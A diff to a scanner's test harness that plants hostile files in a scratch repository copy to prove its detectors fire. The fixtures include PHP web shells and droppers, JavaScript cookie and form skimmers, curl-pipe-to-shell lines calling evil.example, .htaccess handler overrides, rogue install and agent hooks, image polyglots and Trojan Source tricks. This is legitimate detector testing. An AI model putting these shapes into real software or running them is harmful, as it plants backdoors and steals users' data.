@@ -11,6 +11,10 @@
 //             so other people's uncommitted edits cannot move it), a foreign-build storefront, and a
 //             /docker/sporta-shaped tree around it (private/, backups/, releases/, loose files, old copies).
 //             Needs git and a clone with the history; chown-based checks need root and say so when skipped.
+//   verify    the shapes an independent verifier planted and the first detector set missed (callback injection, stream
+//             includes, handler overrides in .htaccess / ini, install hooks in package.json, hooks in .claude/settings.json,
+//             skimmer shapes in shipped JS, Trojan Source, lookalike file names, pasted passwords in scripts/ ...), with
+//             negative controls and a mutation per detector
 //   repo      the REPO-side scanner (scripts/unknown-files-scan.mjs, rules in ops/known-files.json): working tree,
 //             staged package and git history, proven on a scratch git copy of the tree with planted files, a
 //             scratch history, a fake staged package and the real tree (see the repo section below).
@@ -834,8 +838,161 @@ async function repoSection() {
   }
 }
 
+// ================================================================ verify section
+// The shapes the first detector set let through. Found by an independent verifier (2026-11-04) who planted
+// 71 variants on paths a manifest rule already explains (so only the content and name detectors could catch
+// them): 24 were reported. This section holds the variants that were missed, a set of NEGATIVE controls
+// (ordinary code that must stay quiet), and a mutation for every new detector: blind it, and exactly the
+// checks that depend on it must fail.
+//
+//   node scripts/unknown-files-test.mjs --section verify
+async function verifySection() {
+  console.log('\n== verify: shapes the first detector set let through, negative controls, mutations')
+  const SCAN = path.join(HERE, 'unknown-files-scan.mjs')
+  const MAN = path.join(WEB, 'ops', 'known-files.json')
+  let runNo = 0
+  const rnd = (n) => crypto.randomBytes(n * 2).toString('base64').replace(/[^A-Za-z0-9]/g, '').padEnd(n, 'q').slice(0, n)
+  const git = (cwd, ...args) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8', maxBuffer: 1 << 28, stdio: ['ignore', 'pipe', 'pipe'] })
+  const scanV = (root, env = {}) => {
+    const out = path.join(TMP, `verify-run-${++runNo}.json`)
+    const r = spawnSync(process.execPath, [SCAN, '--root', root, '--manifest', MAN, '--json', out, '--quiet'], { encoding: 'utf8', env: { ...process.env, ...env }, maxBuffer: 1 << 28 })
+    const json = fs.existsSync(out) ? JSON.parse(fs.readFileSync(out, 'utf8')) : null
+    return { status: r.status, stderr: r.stderr || '', json, text: json ? fs.readFileSync(out, 'utf8') : '' }
+  }
+  const fOf = (R) => R.json?.findings || []
+  const hasV = (R, det, where) => fOf(R).some((f) => f.detector === det && (f.where === where || f.where.includes(where)))
+  const keyV = (f) => `${f.detector}|${f.where}`
+
+  const ROOT = path.join(TMP, 'verify-tree')
+  fs.mkdirSync(ROOT, { recursive: true })
+  const arch = spawnSync('git', ['-C', REPO, 'archive', 'HEAD'], { maxBuffer: 1 << 30 })
+  const tar = spawnSync('tar', ['-x', '-C', ROOT], { input: arch.stdout, maxBuffer: 1 << 28 })
+  check(arch.status === 0 && tar.status === 0, 'verify: scratch copy of the tree (git archive HEAD)')
+  git(ROOT, 'init', '-q', '-b', 'main'); git(ROOT, 'add', '-A'); git(ROOT, 'commit', '-q', '-m', 'base')
+  const B0 = scanV(ROOT)
+  if (!B0.json) { bad('verify: baseline scan runs', B0.stderr.slice(0, 300)); return }
+
+  const planted = []
+  const put = (rel, body) => { const p = path.join(ROOT, rel); fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, body); planted.push(rel) }
+  const edit = (rel, fn) => { const p = path.join(ROOT, rel); fs.writeFileSync(p, fn(fs.readFileSync(p, 'utf8'))); planted.push(rel) }
+  const D = 'sporta-web/dropin/php-store/', L = 'sporta-live/zz/', S = 'sporta-web/scripts/', CATS = 'sporta-web/public/cats/desktop/'
+  const jpg = (extra) => Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0]), extra, Buffer.from([0xff, 0xd9])])
+  const PASS24 = 'Xk9' + rnd(21), TOK = 'q8Z' + rnd(21), RANDOM35 = 'Rk7' + rnd(32)
+  const NPM = 'npm_' + rnd(36), SG = 'SG.' + rnd(22) + '.' + rnd(43), TG = '123456789:AA' + rnd(33), DOK = 'dop_v1_' + crypto.randomBytes(32).toString('hex')
+
+  // --- PHP
+  put(D + 'v-callback.php', "<?php preg_replace_callback('/.*/', $_POST['f'], $_POST['x']);\n")
+  put(D + 'v-usort.php', "<?php $a = [1, 2]; usort($a, $_GET['f']);\n")
+  put(D + 'v-arraymap.php', "<?php array_map($_POST['f'], [$_POST['x']]);\n")
+  put(D + 'v-stream-data.php', "<?php include 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+';\n")
+  put(D + 'v-stream-input.php', "<?php include 'php://input';\n")
+  put(D + 'v-paren.php', "<?php ($_GET['a'])($_GET['b']);\n")
+  put(D + 'v-input-fn.php', "<?php $f = \"ass\" . \"ert\"; $f(file_get_contents('php://input'));\n")
+  put(D + 'v-headers.php', "<?php $f = 'sys' . 'tem'; $f(getallheaders()['X-C']);\n")
+  put(D + 'v-extract.php', "<?php extract($_POST); echo $name;\n")
+  put(D + 'v-dropper.php', "<?php $s = base64_decode($_POST['p']); file_put_contents('x.php', $s);\n")
+  put(D + 'ok-control.php', "<?php\n$raw = file_get_contents('php://input', false, null, 0, 8193);\n$x = array_map('trim', $_POST);\nusort($rows, fn($a, $b) => $a <=> $b);\n$r = array_filter($_POST);\nrequire __DIR__ . '/config-path.php';\nfile_put_contents($dir . '/note.txt', $raw);\n$id = (int) $_GET['id'];\n")
+  // --- JS (zone web)
+  put(L + 'j-timeout.js', "setTimeout(atob('YWxlcnQoMSk='), 0);\n")
+  put(L + 'j-ctor.js', "[].constructor.constructor(atob('YWxlcnQoMSk='))();\n")
+  put(L + 'j-import.js', "import('data:text/javascript;base64,YWxlcnQoMSk=');\n")
+  put(L + 'j-window.js', "window['ev' + 'al'](atob('YWxlcnQoMSk='));\n")
+  put(L + 'j-script.js', "var s = document.createElement('script'); s.src = 'https://cdn-analytics.example/t.js'; document.head.appendChild(s);\n")
+  put(L + 'j-beacon.js', "document.addEventListener('submit', function (e) { navigator.sendBeacon('https://collect.example/c', new FormData(e.target)) }, true);\n")
+  put(L + 'j-image.js', "new Image().src = 'https://t.example/p?c=' + encodeURIComponent(document.cookie);\n")
+  put(L + 'j-bidi.js', "const isAdmin = false\nif (isAdmin) { /* \u202E } \u2066if (isAdmin)\u2069 \u2066 begin admin only */ grant() }\n")
+  put(L + 'j-zero.js', "const a\u200Bdmin = true\n")
+  put(L + 'ok-control.js', "fetch('/api/store.php?r=products');\nfetch('https://www.sporta.com.kw/api');\nconst label = '\u2068' + name + '\u2069';\nconst s = document.createElement('script'); s.src = '/sporta-features.js';\nsetTimeout(function () { done() }, 10);\n")
+  // --- handlers and configuration that runs things
+  edit('sporta-web/public/.htaccess', (t) => t + '\nAddType application/x-httpd-php .jpg\n')
+  edit('sporta-web/dropin/php-knet/.htaccess', (t) => t + '\n<FilesMatch "\\.(jpg|png)$">\n  SetHandler application/x-httpd-php\n</FilesMatch>\n')
+  edit('sporta-html5/.htaccess', (t) => t + '\nRewriteRule ^(.*)$ https://evil.example/$1 [R=302,L]\n')
+  edit('sporta-live/php/92-sporta-errors.ini', (t) => t + '\nauto_prepend_file = /var/www/html/api/p.php\n')
+  edit('sporta-web/package.json', (t) => t.replace('"scripts": {', '"scripts": {\n    "postinstall": "node scripts/zz-scan.mjs",'))
+  edit('.claude/settings.json', (t) => JSON.stringify({ ...JSON.parse(t), hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'sh ./x.sh' }] }] } }, null, 2))
+  edit('.mcp.json', (t) => { const j = JSON.parse(t); j.mcpServers.helper = { command: 'npx', args: ['-y', 'some-helper'] }; return JSON.stringify(j, null, 2) })
+  put('vercel.json', JSON.stringify({ rewrites: [{ source: '/(.*)', destination: 'https://evil.example/$1' }] }))
+  // --- repo-side scripts that download and run
+  put(S + 'zz-scan.mjs', "import { execSync } from 'node:child_process'\nexecSync('curl -s https://evil.example/x | sh')\n")
+  put(S + 'zz1.sh', '#!/bin/sh\nsh -c "$(curl -fsSL https://evil.example/i)"\n')
+  put(S + 'zz2.sh', '#!/bin/bash\nbash <(curl -s https://evil.example/x)\n')
+  put(S + 'zz4.py', "import urllib.request\nexec(urllib.request.urlopen('https://evil.example/x.py').read())\n")
+  // --- images
+  put(CATS + 'p2.jpg', jpg(Buffer.from('<?=`$_GET[0]`?>')))
+  put(CATS + 'p6.jpg', Buffer.concat([jpg(Buffer.alloc(6_300_000, 0x41)), Buffer.from('<?php system($_GET[0]);?>')]))
+  // --- names
+  put('sporta-web/public/sporta-fe\u0430tures.js', 'console.log(1)\n')
+  put(S + 'zero\u200Bwidth-scan.mjs', 'console.log(1)\n')
+  put(L + 'caf\u0065\u0301.js', 'console.log(1)\n')
+  // --- secrets: a pasted 24-character password in scripts/, provider formats, and the placeholder that used to be a "real" hit
+  put(S + 'zz5.mjs', `const ADMIN_PASSWORD = '${PASS24}'\nconsole.log(ADMIN_PASSWORD.length)\n`)
+  put('sporta-web/ops/zz-job.json', JSON.stringify({ hostinger_token: TOK }) + '\n')
+  put(L + 's-npm.js', `// ${NPM}\n`)
+  put(L + 's-sg.js', `// ${SG}\n`)
+  put(L + 's-tg.js', `// ${TG}\n`)
+  put(L + 's-do.js', `// ${DOK}\n`)
+  put(L + 's-placeholder.js', "var o = { headers: { 'x-lead-secret': 'the-value-of-ALMUHALLAB_LEAD_SECRET' } }\n")
+  put(L + 's-random.js', `var o = { headers: { 'x-lead-secret': '${RANDOM35}' } }\n`)
+  git(ROOT, 'add', '-A')
+
+  const CHECKS = [
+    ['D-PHP-CALLBACK-REQ', D + 'v-callback.php'], ['D-PHP-CALLBACK-REQ', D + 'v-usort.php'], ['D-PHP-CALLBACK-REQ', D + 'v-arraymap.php'],
+    ['D-PHP-STREAM-INC', D + 'v-stream-data.php'], ['D-PHP-STREAM-INC', D + 'v-stream-input.php'],
+    ['D-PHP-VARFUNC', D + 'v-paren.php'], ['D-PHP-VARFUNC', D + 'v-input-fn.php'], ['D-PHP-VARFUNC', D + 'v-headers.php'],
+    ['D-PHP-EXTRACT-REQ', D + 'v-extract.php'], ['D-PHP-DROPPER', D + 'v-dropper.php'],
+    ['D-JS-DYNEXEC', L + 'j-timeout.js'], ['D-JS-DYNEXEC', L + 'j-ctor.js'], ['D-JS-DYNEXEC', L + 'j-import.js'], ['D-JS-DYNEXEC', L + 'j-window.js'],
+    ['D-JS-FOREIGN', L + 'j-script.js'], ['D-JS-FOREIGN', L + 'j-beacon.js'], ['D-JS-FOREIGN', L + 'j-image.js'],
+    ['D-BIDI-IN-SOURCE', L + 'j-bidi.js'], ['D-BIDI-IN-SOURCE', L + 'j-zero.js'],
+    ['D-HT-HANDLER', 'sporta-web/public/.htaccess'], ['D-HT-HANDLER', 'sporta-web/dropin/php-knet/.htaccess'], ['D-HT-REDIRECT', 'sporta-html5/.htaccess'], ['D-HT-HANDLER', 'sporta-live/php/92-sporta-errors.ini'],
+    ['D-CONFIG-EXEC', 'sporta-web/package.json'], ['D-CONFIG-EXEC', '.claude/settings.json'], ['D-CONFIG-EXEC', '.mcp.json'], ['D-CONFIG-EXEC', 'vercel.json'],
+    ['D-SHELL-PIPE', S + 'zz-scan.mjs'], ['D-SHELL-PIPE', S + 'zz1.sh'], ['D-SHELL-PIPE', S + 'zz2.sh'], ['D-SHELL-PIPE', S + 'zz4.py'],
+    ['D-POLYGLOT', CATS + 'p2.jpg'], ['D-POLYGLOT', CATS + 'p6.jpg'],
+    ['D-NAME-ODD', 'sporta-web/public/sporta-fe\u0430tures.js'], ['D-NAME-ODD', S + 'zero\u200Bwidth-scan.mjs'], ['D-NAME-ODD', L + 'caf\u0065\u0301.js'],
+    ['S-NAMED', S + 'zz5.mjs'], ['S-NAMED', 'sporta-web/ops/zz-job.json'], ['S-NPM', L + 's-npm.js'], ['S-SENDGRID', L + 's-sg.js'], ['S-TELEGRAM', L + 's-tg.js'], ['S-DOSHOP', L + 's-do.js'],
+    ['S-NAMED', L + 's-random.js'],
+  ]
+  const CONTROLS = [D + 'ok-control.php', L + 'ok-control.js', L + 's-placeholder.js']
+  const R1 = scanV(ROOT)
+  check(!!R1.json, 'verify: the planted tree scans', R1.stderr.slice(0, 300))
+  if (!R1.json) return
+  for (const [det, where] of CHECKS) check(hasV(R1, det, where), `verify: ${det.padEnd(18)} ${where.replace(/[^\x20-\x7e]/g, '?')}`)
+  const quiet = (R, w) => fOf(R).filter((f) => f.where === w && !['D-ORPHAN', 'D-DUPLICATE'].includes(f.detector))
+  for (const c of CONTROLS) check(quiet(R1, c).length === 0, `verify: negative control stays quiet: ${c}`, quiet(R1, c).map((f) => f.detector).join(','))
+  const before = new Set(fOf(B0).map(keyV))
+  const fresh = fOf(R1).filter((f) => !before.has(keyV(f)))
+  const stray = fresh.filter((f) => !planted.some((p) => f.where === p || f.where.startsWith(p)) && !['D-DUPLICATE', 'D-LARGE', 'D-CASE-COLLIDE', 'S-TEST-CRED'].includes(f.detector))
+  check(stray.length === 0, `verify: nothing else is newly flagged (${fresh.length} new findings, all on planted files)`, stray.slice(0, 5).map(keyV).join('; '))
+  check(![PASS24, TOK, RANDOM35, NPM, SG, TG, DOK].some((v) => R1.text.includes(v)), 'verify: no planted secret value appears in the JSON')
+  const unb = fOf(R1).find((f) => f.detector === 'D-CONFIG-EXEC' && f.where === 'sporta-web/package.json')
+  check(!!unb && /postinstall/.test(unb.evidence), 'verify: the npm install hook is named in the finding', unb?.evidence)
+
+  // --- mutations: blind the detectors (and the two judging rules); only the checks that depend on them may fail
+  const dets = [...new Set(CHECKS.map((c) => c[0]))].filter((d) => !['S-NAMED', 'D-PHP-VARFUNC'].includes(d))
+  const groups = [0, 1].map((m) => dets.filter((_, i) => i % 2 === m))
+  for (const [gi, grp] of groups.entries()) {
+    const R = scanV(ROOT, { UFS_BLIND: grp.join(',') })
+    if (!R.json) { bad(`verify: mutation group ${gi + 1} runs`, R.stderr.slice(0, 200)); continue }
+    const wrong = []
+    for (const [det, where] of CHECKS) {
+      const found = hasV(R, det, where)
+      if (grp.includes(det) && found) wrong.push(`${det} still reported at ${where.replace(/[^\x20-\x7e]/g, '?')}`)
+      if (!grp.includes(det) && !found && hasV(R1, det, where)) wrong.push(`${det} at ${where.replace(/[^\x20-\x7e]/g, '?')} lost without being blinded`)
+    }
+    check(wrong.length === 0, `verify: mutation: blinding ${grp.length} detectors (${grp.slice(0, 4).join(', ')}${grp.length > 4 ? ', ...' : ''}) fails exactly their checks`, wrong.slice(0, 3).join('; '))
+  }
+  const RV = scanV(ROOT, { UFS_BLIND: 'D-PHP-VARFUNC' })
+  check(RV.json && !hasV(RV, 'D-PHP-VARFUNC', D + 'v-paren.php') && !hasV(RV, 'D-PHP-VARFUNC', D + 'v-input-fn.php') && hasV(RV, 'D-PHP-CALLBACK-REQ', D + 'v-usort.php'), 'verify: mutation: blinding D-PHP-VARFUNC loses the three variable-function shapes and nothing else')
+  const RN = scanV(ROOT, { UFS_BLIND: 'S-NAMED' })
+  check(RN.json && !hasV(RN, 'S-NAMED', S + 'zz5.mjs') && !hasV(RN, 'S-NAMED', L + 's-random.js') && hasV(RN, 'S-NPM', L + 's-npm.js'), 'verify: mutation: blinding S-NAMED loses the named-credential checks and nothing else')
+  const RT = scanV(ROOT, { UFS_BLIND: 'J-TESTZONE' })
+  check(RT.json && !hasV(RT, 'S-NAMED', S + 'zz5.mjs') && !hasV(RT, 'S-NAMED', 'sporta-web/ops/zz-job.json') && hasV(RT, 'S-NAMED', L + 's-random.js'), 'verify: mutation: without the test-zone rule a pasted 24-character password in scripts/ is a "test credential" again')
+  const RJ = scanV(ROOT, { UFS_BLIND: 'J-VARNAME' })
+  check(RJ.json && hasV(RJ, 'S-NAMED', L + 's-placeholder.js'), 'verify: mutation: without the variable-name rule "the-value-of-ALMUHALLAB_LEAD_SECRET" is a "real" secret again (the history scan\'s one false alarm)')
+}
+
 // ---------------------------------------------------------------- main
 if (wanted === 'all' || wanted === 'repo') await repoSection()
+if (wanted === 'all' || wanted === 'verify') await verifySection()
 if (wanted === 'all' || wanted === 'live') {
   await liveSection()
   // the mutation harness reuses the docroots the live section left in TMP
